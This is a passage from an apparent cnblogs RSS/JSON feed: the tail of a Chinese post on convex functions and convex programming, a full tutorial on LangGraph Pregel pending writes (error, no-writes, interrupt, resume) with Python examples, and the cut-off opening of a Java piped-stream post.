\\tag{1}\n\\]</div><p></p><p>则称<span class=\"math inline\">\\(f\\)</span>为定义在凸集<span class=\"math inline\">\\(C\\)</span>上<strong>严格凸函数</strong>。</p>\n<p>​\t<strong>Definition 6.5</strong> 若函数<span class=\"math inline\">\\(g(\\mathbf{X})=-f(\\mathbf{X})\\)</span>在凸集<span class=\"math inline\">\\(C\\)</span> 上是（严格）凸函数，则称<span class=\"math inline\">\\(f\\)</span>是定义在凸集<span class=\"math inline\">\\(C\\)</span> 上的（严格）凹函数。</p>\n<p>​\t<strong>定理 6.2</strong> 设<span class=\"math inline\">\\(f:C\\subset\\mathbf{R}^n\\rightarrow\\mathbf{R}^1\\)</span>，其中<span class=\"math inline\">\\(\\mathbf{C}\\)</span>为非空凸集。若<span class=\"math inline\">\\(f\\)</span>是凸函数，则对于任意实数<span class=\"math inline\">\\(\\beta\\)</span>, 水平集<span class=\"math inline\">\\(\\mathbf{D}_{\\beta}=\\{\\mathbf{X}|f(\\mathbf{X})\\leq\\beta,\\mathbf{X}\\in{C}\\}\\)</span> 是凸集。</p>\n<p>​\t<strong>证  明：</strong> 若<span class=\"math inline\">\\(\\mathbf{D}_{\\beta}\\)</span>是空集，则<span class=\"math inline\">\\(\\mathbf{D}_{\\beta}\\)</span> 是凸集。以下设<span class=\"math inline\">\\(\\mathbf{D}_{\\beta}\\)</span> 非空，任取<span class=\"math inline\">\\(\\mathbf{X}_1\\)</span> ,<span class=\"math inline\">\\(\\mathbf{X}_2\\in{D_{\\beta}}\\)</span> ,  则<span class=\"math inline\">\\(f(\\mathbf{X}_1)\\leq\\beta,f(\\mathbf{X}_2)\\leq\\beta\\)</span> 。设<span class=\"math inline\">\\(\\alpha_1,\\alpha_2\\in[0,1]\\)</span> ,且<span class=\"math inline\">\\(\\alpha_1+\\alpha_2=1\\)</span> 根据<span class=\"math inline\">\\(f\\)</span>的凸性，必有</p>\n<p></p><div class=\"math display\">\\[f(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2)\\leq \\alpha_1f(\\mathbf{X}_1)+\\alpha_2f(\\mathbf{X}_2)\\leq \\alpha_1\\beta+\\alpha_2\\beta=\\beta \\tag{2}\n\\]</div><p></p><p>即 <span class=\"math inline\">\\(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2\\in{\\mathbf{D}_{\\beta}}\\)</span> ,所以 <span class=\"math inline\">\\(\\mathbf{D}_{\\beta}\\)</span> 是凸集。</p>\n<h2 id=\"3判断凸函数的方法\">3.判断凸函数的方法</h2>\n<p>​\t判定一个函数是否为凸函数，一般来说比较困难，但函数可微时，有如下几个定理可供使用。</p>\n<p>​\t<strong>定理 6.3</strong> 设<span class=\"math inline\">\\(f:\\mathbf{C}\\subseteq\\mathbf{R}^n\\rightarrow{\\mathbf{R}^1}\\)</span> 是可微函数，其中<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 为凸集，则：</p>\n<ol>\n<li>\n<p><span class=\"math inline\">\\(f\\)</span>为凸函数的<strong>充要条件</strong>是，<span class=\"math inline\">\\(\\forall \\mathbf{X}_1,\\mathbf{X}_2\\in{\\mathbf{C}}\\)</span>, 都有</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}_2)\\geq f(\\mathbf{X}_1)+\\nabla{f(\\mathbf{X}_1)}^T(\\mathbf{X}_2-\\mathbf{X}_1) \\tag{3}\n\\]</div><p></p><p>​</p>\n</li>\n<li>\n<p><span class=\"math inline\">\\(f\\)</span>为严格凸函数的<strong>充要条件</strong>是，<span class=\"math inline\">\\(\\forall \\mathbf{X}_1,\\mathbf{X}_2\\in\\mathbf{C}\\)</span>,且<span class=\"math inline\">\\(\\mathbf{X}_1\\neq\\mathbf{X}_2\\)</span>,都有</p>\n</li>\n</ol>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}_2)&gt;f(\\mathbf{X}_1)+\\nabla f(\\mathbf{X_1})^T(\\mathbf{X}_2-\\mathbf{X}_1) \\tag{4}\n\\]</div><p></p><p><strong>证 明：</strong> （1）<strong>必要性证明</strong>：已知<span class=\"math inline\">\\(f\\)</span>是<span class=\"math inline\">\\(\\mathbf{C}\\)</span>上的凸函数，证明式（3）。由凸函数定义可知，对满足<span class=\"math inline\">\\(\\alpha_1+\\alpha_2=1\\)</span> 的任意正数<span class=\"math inline\">\\(\\alpha_1,\\alpha_2\\in[0,1]\\)</span>都有</p>\n<p></p><div class=\"math display\">\\[f(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2)\\leq\\alpha_1f(\\mathbf{X}_1)+\\alpha_2f(\\mathbf{X}_2) \\tag{5}\n\\]</div><p></p><p>令<span class=\"math inline\">\\(\\alpha_2=t\\)</span>，则<span class=\"math inline\">\\(\\alpha_1=1-t\\)</span>，代入上式中，整理得到：</p>\n<p></p><div class=\"math display\">\\[\\frac{f(\\mathbf{X}_1+t(\\mathbf{X}_2-\\mathbf{X}_1))-f(\\mathbf{X}_1)}{t}\\leq f(\\mathbf{X}_2)-f(\\mathbf{X}_1) \\tag{6}\n\\]</div><p></p><p>令 <span class=\"math inline\">\\(t\\rightarrow{0}\\)</span> ,由<span class=\"math inline\">\\(f\\)</span>的可微性，利用一阶Taylor展开式，方向导数定义及式（6）可得：</p>\n<p></p><div class=\"math display\">\\[\\nabla f(\\mathbf{X}_1)^T(\\mathbf{X}_2-\\mathbf{X}_1)\\leq {f(\\mathbf{X}_2)-f(\\mathbf{X}_1)} \\tag{7}\n\\]</div><p></p><p>必要性得证；</p>\n<p><strong>充分性证明：</strong> 任取一对正数<span class=\"math inline\">\\(\\alpha_1,\\alpha_2\\in[0,1]\\)</span> ,且<span class=\"math inline\">\\(\\alpha_1+\\alpha_2=1\\)</span>，考虑点 <span class=\"math inline\">\\(\\mathbf{X}=\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2\\)</span> 根据充分性假设，应有：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;f(\\mathbf{X}_1)\\geq f(\\mathbf{X})+\\nabla f(\\mathbf{X})^T(\\mathbf{X}_1-\\mathbf{X})\\\\\n&amp;f(\\mathbf{X}_2)\\geq f(\\mathbf{X})+\\nabla f(\\mathbf{X})^T(\\mathbf{X}_2-\\mathbf{X})\n\\end{aligned}\n\\tag{8}\n\\]</div><p></p><p>两式分别乘以<span class=\"math inline\">\\(\\alpha_1\\)</span> 和<span class=\"math inline\">\\(\\alpha_2\\)</span> 后相加，得到：</p>\n<p></p><div class=\"math display\">\\[\\alpha_1f(\\mathbf{X}_1)+\\alpha_2f(\\mathbf{X}_2)\\geq f(\\mathbf{X})+\\nabla f(\\mathbf{X})^T(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2-\\mathbf{X})=f(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2) \\tag{9} \n\\]</div><p></p><p>由凸函数定义可知，<span class=\"math inline\">\\(f\\)</span> 是<span class=\"math inline\">\\(\\mathbf{C}\\)</span>上的凸函数。</p>\n<p>​\t（2）命题（2）充分性可仿照命题（1）的充分性证得；</p>\n<p>​\t必要性：因为严格凸函数本身是凸函数，所以<span class=\"math inline\">\\(\\forall \\mathbf{X}_1,\\mathbf{X}_2\\in{\\mathbf{C}}\\)</span> ,且<span class=\"math inline\">\\(\\mathbf{X}_1\\neq\\mathbf{X}_2\\)</span> 都有</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}_2)\\geq f(\\mathbf{X}_1)+\\nabla f(\\mathbf{X}_1)^T(\\mathbf{X}_2-\\mathbf{X}_1) \\tag{10}\n\\]</div><p></p><p>以下证明式中只能取\"&gt;\"号，假设存在<span class=\"math inline\">\\(\\mathbf{X}_1,\\mathbf{X}_2\\in{\\mathbf{C}}\\)</span> 且<span class=\"math inline\">\\(\\mathbf{X}_1\\neq\\mathbf{X}_2\\)</span> ,满足</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}_2)=f(\\mathbf{X}_1)+\\nabla f(\\mathbf{X}_1)^T(\\mathbf{X}_2-\\mathbf{X}_1) \\tag{11}\n\\]</div><p></p><p>取<span class=\"math inline\">\\(\\mathbf{X}=\\frac{1}{2}\\mathbf{X}_1+\\frac{1}{2}\\mathbf{X}_2\\)</span> ,由<span class=\"math inline\">\\(f\\)</span> 的严格凸性，有：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}_3)&lt;\\frac{1}{2}f(\\mathbf{X}_1)+\\frac{1}{2}f(\\mathbf{X}_2) \\tag{12}\n\\]</div><p></p><p>把式（11）代入式（12）中，经整理得：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}_3)&lt;f(\\mathbf{X}_1)+\\nabla f(\\mathbf{X}_1)^T(\\mathbf{X}_3-\\mathbf{X}_1) \\tag{13}\n\\]</div><p></p><p>根据本定理（1）部分结论得知，此时与<span class=\"math inline\">\\(f\\)</span>的凸性相矛盾。</p>\n<p>​\t<strong>定 理 6.4</strong> 设<span class=\"math inline\">\\(f:\\mathbf{C}\\subseteq\\mathbf{R}^n\\rightarrow\\mathbf{R}^1\\)</span> 是二次可微函数，<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 为非空开凸集，则<span class=\"math inline\">\\(f\\)</span>为<span class=\"math inline\">\\(C\\)</span>上为凸函数的充要条件是 ，<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 的Hessian矩阵<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X})\\)</span> 在凸集<span class=\"math inline\">\\(C\\)</span> 处处半正定，即<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X})\\succeq{0}\\)</span> 。</p>\n<p>​\t<strong>定 理6.5</strong>  设<span class=\"math inline\">\\(f:\\mathbf{C}\\subseteq\\mathbf{R}^n\\rightarrow{\\mathbf{R}^1}\\)</span> 是二次可微函数，<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 为非空凸集。若<span class=\"math inline\">\\(Hessian\\)</span>矩阵<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X})\\)</span> 在凸集<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 上到处正定，则 <span class=\"math inline\">\\(f\\)</span>在<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 上为严格凸函数。</p>\n<p>​      需要注意，该定理的逆命题不真。</p>\n<p>​      例如 <span class=\"math inline\">\\(f(x)=x^4\\)</span> 在<span class=\"math inline\">\\(\\mathbf{R}^1\\)</span> 上为严格凸函数，但是它的<span class=\"math inline\">\\(Hessian\\)</span>矩阵<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{x})=12x^2\\)</span>在点<span class=\"math inline\">\\(x=0\\)</span> 处是半正定的。</p>\n<h2 id=\"4凸规划-convex-programing\">4.凸规划 （Convex Programing）</h2>\n<p>​\t凸规划是数学优化中的一个重要概念，指目标函数（损失函数）为凸函数、可行域为凸集的优化问题，具有许多的优化性质，例如局部最优解就是全局最优解，且对偶理论成熟。广泛应用于机器学习，信号处理，金融工程等领域。</p>\n<p><strong>Definition 6.6 （凸规划问题）</strong> 设<span class=\"math inline\">\\(f:\\mathbf{C}\\subseteq\\mathbf{R}^n\\rightarrow{\\mathbf{R}^1}\\)</span> ，其中 <span class=\"math inline\">\\(\\mathbf{C}\\)</span> 是非空凸集合 ，<span class=\"math inline\">\\(f\\)</span> 为凸函数，则形式如下：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;\\min f(\\mathbf{X})\\\\\n&amp;s.t. \\mathbf{X}\\in{\\mathbf{C}}\n\\end{aligned}\n\\tag{14}\n\\]</div><p></p><p>的优化问题为<strong>凸规划问题</strong>。更进一步，设将可行域的凸集可写为如下形式：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n\\mathbf{C}=\\{\\mathbf{X}|g_i(\\mathbf{X})\\geq0,i=1,\\cdots,l;h_j(\\mathbf{X})=0,j=1,\\cdots,m,\\mathbf{X}\\in R^n\\}\n\\end{aligned}\n\\tag{15}\n\\]</div><p></p><p>若<span class=\"math inline\">\\(g_1,g_2,\\cdots,g_l\\)</span> 都是<span class=\"math inline\">\\(\\mathbf{R}^n\\)</span> 上的凸函数，<span class=\"math inline\">\\(h_1,h_2,\\cdots,h_m\\)</span> 都是<span class=\"math inline\">\\(R^n\\)</span>上的线性函数，则容易验证<span class=\"math inline\">\\(C\\)</span>是凸集 。事实上，因为<span class=\"math inline\">\\(-g_1,-g_2,-g_l\\)</span>都是凸函数，根据定理6.2集合<span class=\"math inline\">\\(\\mathbf{C}_i=\\{\\mathbf{X}|-g(\\mathbf{X})_i\\leq0,\\mathbf{X}\\in{\\mathbf{R}^n}\\}(i=1,2,\\cdots,l)\\)</span> 也都是凸集。此外，超平面<span class=\"math inline\">\\(P_j=\\{\\mathbf{X}|h_j(\\mathbf{X})=0,\\mathbf{X}\\in{\\mathbf{R}^n}\\}(j=1,\\cdots,m)\\)</span> 也都是凸集。显然，<span class=\"math inline\">\\(C\\)</span>是<span class=\"math inline\">\\(C_1,\\cdots,C_l,P_1,\\cdots,P_m\\)</span> 的交集，也是凸集。于是，这种情况下凸规划问题又可表示成如下形式：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;\\min{f(\\mathbf{X})}\\\\\n&amp;s.t.\\begin{cases}\ng_i(\\mathbf{X})\\geq0 ,\\hspace{2em} i=1,2,\\cdots,l\\\\\nh_j(\\mathbf{X})=0,\\hspace{2em} j=1,2,\\cdots,m\n\\end{cases}\n\\end{aligned}\n\\tag{16}\n\\]</div><p></p><p>如下定理指明凸规划的一个重要性质。</p>\n<p>​\t<strong>定 理6.6</strong> 设<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是凸规划问题的局部极小值，</p>\n<ol>\n<li>若<span class=\"math inline\">\\(f\\)</span>是凸函数，则<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是凸规划问题的局部极小值点；</li>\n<li>若<span class=\"math inline\">\\(f\\)</span>是严格凸函数，则<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 是凸规划问题的唯一全局极小值点。</li>\n</ol>\n<p><strong>证  明：</strong>（1）使用反证法。假设<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 不是全局极小值点，则必存在<span class=\"math inline\">\\(Z\\in\\mathbf{C}\\)</span> 使得 <span class=\"math inline\">\\(f(\\mathbf{Z})&lt;f(\\mathbf{X})\\)</span> 。对应<span class=\"math inline\">\\(\\mathbf{Z}\\)</span> 与<span class=\"math inline\">\\(\\mathbf{X}^*\\)</span> 的任意凸组合<span class=\"math inline\">\\(\\mathbf{X}=\\alpha_1\\mathbf{Z}+\\alpha_2\\mathbf{X}^*\\)</span>,其中<span class=\"math inline\">\\(\\alpha_1,\\alpha_2\\in(0,1)\\)</span> 且<span class=\"math inline\">\\(\\alpha_1+\\alpha_2=1\\)</span>，根据<span class=\"math inline\">\\(f\\)</span>的凸性，有</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X})=f(\\alpha_1\\mathbf{Z}+\\alpha_2\\mathbf{X}^*)\\leq \\alpha_1f(\\mathbf{Z})+\\alpha_2f(\\mathbf{X}^*)&lt;\\alpha_1f(\\mathbf{X}^*)+\\alpha_2f(\\mathbf{X}^*)=f(\\mathbf{X}^*) \\tag{17}\n\\]</div><p></p><p>由此看到，当<span class=\"math inline\">\\(\\alpha_1&gt;0\\)</span>充分小时，<span class=\"math inline\">\\(\\mathbf{X}\\)</span>充分接近<span class=\"math inline\">\\(\\mathbf{X}^*\\)</span> ，注意到此时也有<span class=\"math inline\">\\(f(\\mathbf{X})&lt;f(\\mathbf{X}^*)\\)</span>，而这与<span class=\"math inline\">\\(\\mathbf{X}^*\\)</span> 是局部极小值点相矛盾，因此<span class=\"math inline\">\\(\\mathbf{X}^*\\)</span> 必是全局极小值。</p>\n<p>​\t        (2) 假设<span class=\"math inline\">\\(\\mathbf{X}^*\\)</span> 不是唯一全局的极小值点，必存在<span class=\"math inline\">\\(\\mathbf{X}^{'}\\in\\mathbf{C}\\)</span> 但<span class=\"math inline\">\\(\\mathbf{X}^{\\prime}\\neq\\mathbf{X}^*\\)</span>，使得<span class=\"math inline\">\\(f(\\mathbf{X}^{\\prime})=f(\\mathbf{X}^*)\\)</span>。考虑中点<span class=\"math inline\">\\(\\mathbf{X}=\\frac{1}{2}(\\mathbf{X}^{\\prime}+\\mathbf{X}^{*})\\in{\\mathbf{C}}\\)</span> 。由于 <span class=\"math inline\">\\(f\\)</span>的严格的凸性，有</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X})=f(\\frac{1}{2}(\\mathbf{X^*}+\\mathbf{X}^{\\prime}))&lt;\\frac{1}{2}(f(\\mathbf{X}^*)+f(\\mathbf{X}^{\\prime}))=f(\\mathbf{X}^{*}) \\tag{18}\n\\]</div><p></p><p>此式与<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> 为全局极小值点相矛盾。这就证明了唯一性。</p>\n<p>​       由上面的推导可知，凸规划有如下优秀的重要性质：</p>\n<ol>\n<li>\n<p><strong>局部最优即全局最优</strong>：凸规划的任一局部极小值点都是全局极小值点；</p>\n</li>\n<li>\n<p><strong>最优解集为凸集</strong>：若存在最优解，则所有最优解构成一个凸集；</p>\n</li>\n<li>\n<p><strong>可微情况下的最优性条件</strong>：若<span class=\"math inline\">\\(f\\)</span>可微，则<span class=\"math inline\">\\(\\mathbf{x}^*\\)</span>为全局最优解的情况下，的充要条件：</p>\n<p></p><div class=\"math display\">\\[\\nabla f(\\mathbf{x}^*)^T(\\mathbf{y}-\\mathbf{x}^*)\\geq{0} \\hspace{2em}\\forall{y}\\in{X}\n\\]</div><p></p></li>\n<li>\n<p><strong>对偶理论</strong>：凸规划的对偶问题也是凸的，且强对偶性通常成立（在某些约束品性下，如Slater条件），即原问题与对偶问题的最优值相等。</p>\n</li>\n</ol>\n<p>其常见的优化问题的例子：</p>\n<ul>\n<li><strong>线性规划</strong>：目标函数和约束均为线性，显然满足凸性。</li>\n<li><strong>二次规划</strong>：目标函数为二次型 <span class=\"math inline\">\\(\\frac{1}{2}x^TQx+c^Tx\\)</span>，若 <span class=\"math inline\">\\(Q\\)</span> 半正定，则为凸二次规划。</li>\n<li><strong>最小二乘：</strong><span class=\"math inline\">\\(min||\\mathbf{A}x-b||_2^2\\)</span> 是凸的；</li>\n<li><strong>锥规划</strong>：如二阶锥规划、半定规划，都是凸规划的重要推广。</li>\n</ul>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-20 14:30</span>&nbsp;\n<a href=\"https://www.cnblogs.com/GeophysicsWorker\">GeoFXR</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "[拆解LangChain执行引擎]非常规Pending Write的持久化",
      "link": "https://www.cnblogs.com/jaydenai/p/19625923/non-regular-pending-writes",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jaydenai/p/19625923/non-regular-pending-writes\" id=\"cb_post_title_url\" title=\"发布于 2026-02-20 09:11\">\n    <span>[拆解LangChain执行引擎]非常规Pending Write的持久化</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        PendingWrite三元组的第二部分表示写入的Channel，但是对于一些特殊的场景，比如出错、无写入、中断和恢复，它们的值不再是一个普通的Channel名称\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>PendingWrite三元组的第二部分表示写入的Channel，但是对于一些特殊的场景，比如出错、无写入、中断和恢复，它们的值不再是一个普通的Channel名称，而是使用如下的值：</p>\n<ul>\n<li><code>__error__</code>：执行Node对应的任务出现异常；</li>\n<li><code>__no_writes__</code>：Node任务成功执行，但是没有执行针对Channel的输出；</li>\n<li><code>__interrupt__</code>：任务中断；</li>\n<li><code>__resume__</code>：表示恢复执行提供的数据；</li>\n</ul>\n<p>接下来我们两个例子来产生上述这几种特殊的Pending Write。我们先来模拟出错的场景，如下面的代码片段所示，我们执行的Pregel对象具有一个唯一的Node，它的处理函数直接抛出一个异常。</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue\nfrom langgraph.checkpoint.memory import InMemorySaver\nfrom typing import Any\n\ndef handle(args: dict[str, Any])-&gt;None:\n    raise Exception(\"manllually raised exception\")\n\nnode = NodeBuilder().subscribe_to(\"start\").do(handle)\napp = Pregel(\n    nodes={\"body\": node},\n    channels={\"start\": LastValue(str)},\n    checkpointer=InMemorySaver(),\n    input_channels=[\"start\"],\n    output_channels=[],\n)\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\ntry:\n    result = app.invoke({\"start\": \"begin\"}, config=config)\nexcept Exception as ex:\n    print(f\"Caught exception:{ex}\" )\n\n(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)\nprint(pending_writes)\n</code></pre>\n<p>我们在try/except块中完成针对Pregel的调用，并捕捉和输出得到的异常信息。接下来我们调用Checkpointer（一个InMemorySaver对象）的<code>get_tuple</code>方法得到对应的<code>CheckpointTuple</code>元组，然后将<code>pending_writes</code>部分输出出来。从如下所示的输出结果可以看出，这个Pending Write三元组的Channel名称被设置为 <code>__error__</code> ，整个Exception对象成为了写入的内容。</p>\n<pre><code>Caught exception:manllually raised exception\n[('f9ff1e88-4d82-f417-ad11-8fd870bfe647', '__error__', \"Exception('manllually raised exception')\")]\n</code></pre>\n<p>由于并不是所有的Node都有向Channel写入执行结果的需求，所以只要处理函数成功执行，即使没有Channel输出的行为，该任务的状态也会被视为<code>成功</code>，Checkpointer只是采用不同的形式来记录这种不需要写入的Pending Write。如下的这个程序不仅仅演示了这种<code>无输出写入</code>的场景，还同时模拟了中断和恢复。</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue\nfrom langgraph.checkpoint.memory import InMemorySaver\nfrom typing import Any\nfrom langgraph.types import Command, interrupt\n\ndef foo(args: dict[str, Any]) -&gt; list[str]:\n    resume1 = interrupt(\"1st interrupt\")\n    assert resume1 == \"1st resume\"\n\n    resume2 = interrupt(\"2nd interrupt\")\n    assert resume2 == \"2nd resume\"\n\n    resume3 = interrupt(\"3rd interrupt\")\n    assert resume3 == \"3rd resume\"\n\n    return [resume1, resume2, resume3]\n\ndef bar(args: dict[str, Any]) -&gt; None:\n    pass\n\napp = Pregel(\n    nodes={\n        \"foo\": NodeBuilder().subscribe_only(\"start\").do(foo).write_to(\"output\"),\n        \"bar\": NodeBuilder().subscribe_only(\"start\").do(bar),\n    },\n    channels={\n        \"start\": LastValue(str),\n        \"output\": LastValue(list[str]),\n    },\n    input_channels=[\"start\"],\n    output_channels=[\"output\"],\n    checkpointer=InMemorySaver(),\n)\n\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\nresult = app.invoke(input={\"start\": \"begin\"}, config=config, stream_mode=\"tasks\")\n(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)\nprint(f\"After invoke:\\n{pending_writes}\")\n\napp.invoke(input=Command(resume=\"1st resume\"), config=config)\n(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)\nprint(f\"\\nAfter resume 1:\\n{pending_writes}\")\n\napp.invoke(input=Command(resume=\"2nd resume\"), config=config)\n(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)\nprint(f\"\\nAfter resume 2:\\n{pending_writes}\")\n\nresult = app.invoke(input=Command(resume=\"3rd resume\"), config=config)\nassert result == {\"output\": [\"1st resume\", \"2nd resume\", \"3rd resume\"]}\n(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)\nprint(f\"\\nAfter resume 3:\\n{pending_writes}\")\n</code></pre>\n<p>如上面的代码片段所示，我们为Pregel提供了两个并行执行的节点foo和bar，其中bar对应的函数并未执行任何有效操作，也没有任何的输出。我们为节点foo对应的处理函数制造了三次人为中断，所以需要至少四次调用才能结束。</p>\n<p>我们在创建的RunnableConfig对象中提供了统一的Thread ID，并将它作为后续方法调用的参数。针对Pregel的三次调用，第一次是为常规调用，后面两次分别是针对两次中断的恢复调用。我们在每次调用后，得到并输出Checkpointer记录下来的Pending Write。</p>\n<p>从如下的输出结果可以看出，第一次常规调用后， 节点foo停在第一个中断处，节点bar成功执行但没有输出，所以Checkpointer将它们作为Pending Write记录下来，Channel名称分别是<code>__interrupt__</code>和<code>__no_writes__</code>，前者的写入内容是一个<code>Interrupt</code>对象，它具有我们指定的值“1st interrupt”。我们也看到了Interrupt对象具有一个唯一标识，在恢复调用时我们可以利用此标识为其指定针对性的恢复数据（Command(resume={\"id\":\"resume value\")）。</p>\n<pre><code>After invoke:\n[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='1st interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None)]\n\nAfter resume 1:\n[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='2nd interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None), ('00000000-0000-0000-0000-000000000000', '__resume__', '1st resume'), ('8d407c25-02f6-9101-d1b8-5a99c247edde', '__resume__', ['1st resume'])]\n\nAfter resume 2:\n[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='3rd interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None), ('00000000-0000-0000-0000-000000000000', '__resume__', '2nd resume'), ('8d407c25-02f6-9101-d1b8-5a99c247edde', '__resume__', ['1st resume', '2nd resume'])]\n\nAfter resume 3:\n[]\n</code></pre>\n<p>针对第一个中断的恢复调用后，节点foo停在第二个中断处，此时Checkpointer会创建两个新的Pending Write持久化我们提供的Resume Value（“1st resume”），它的Channel名称就是<code>__resume__</code>，但为什么是两个呢？</p>\n<p>这实际上反映了 Pregel 处理<code>外部指令注入</code>与<code>Node内部消费</code>的同步机制。第一个被称为全局Resume Value（Global Resume Value）, 它代表从外部（通过Command(resume=...)）注入到图中的原始指令。由于它不是由图内Node产生的，因此 Task ID 为空，它是唤醒整个暂停状态的“总开关”。第二个节点foo对全局Resume Value的消费记录，所以具有一个明确的Taks ID。当节点foo被唤醒并执行到interrupt行时，它会从全局Resume Value读取数据。为了保证幂等性和可回溯性，系统会将<code>拿走了哪个Resume Value</code>记录在它的任务路径下。</p>\n<p>针对Resume的冗余设置是为了解决<code>重入与回溯</code>问题。全局记录证明了<code>用户确实提供了这个值</code>。Node记录证明了<code>这个值确实被这个特定的interrupt函数调用消费了</code>。一个Node内部可以连续调用多次interrupt函数，系统需要按顺序记录该Node消费过的所有Resume Value，以便在“时间旅行”或重试时能够精确对齐。</p>\n<p>当我们调用interrupt函数实施人为中断时，底层实际上会抛出一个<code>GraphInterrupt</code>异常，Pregel通过捕获这个异常进而生成针对性的PendingWrite，所以针对同一个任务有可能有一个唯一的中断类型的PendingWrite。由于恢复执行总是会<code>从头执行Node函数</code>，所以基于中断的PendingWrite并不会恢复执行造成任何影响。所以当我们完成第二次恢复调用后，持久化的中断PendingWrite反映的是针对第二次interrupt函数的调用，对应Interrupt对象的值为<code>2nd interrupt</code>。</p>\n<p>Resume Value必须按照顺序提供，因为每遇到一个interrpt函数的调用，都会利用前面介绍过的计算器提供的索引，从Resume Value列表中读取Resume Value作为该调用的返回值，所以持久化的第二个基于恢复的PendingWrite对应的值变成了包含两个Resume Value的列表（['1st resume', '2nd resume']）。</p>\n<p>在针对第三个中断的恢复执行结束后，fooNode完成了它的执行任务，而bar对应的任务本身就是成功状态，所以整个Superstep顺利结束，自然也就不存在Pending Write了。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-20 09:11</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jaydenai\">JaydenAI</a>&nbsp;\n阅读(<span id=\"post_view_count\">43</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "9、PipedInputStream和PipedOutputStream的源码分析和使用方法详细分析",
      "link": "https://www.cnblogs.com/Carey-ccl/p/19625392",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Carey-ccl/p/19625392\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 22:07\">\n    <span>9、PipedInputStream和PipedOutputStream的源码分析和使用方法详细分析</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>  在多线程编程中，线程间的数据交换是一个常见需求。Java IO包中的PipedInputStream和PipedOutputStream提供了一种高效的线程间通信机制，允许一批（多个）线程向PipedOutputStream写入数据，另一批（多个）线程从PipedInputStream读取数据。<br />\n  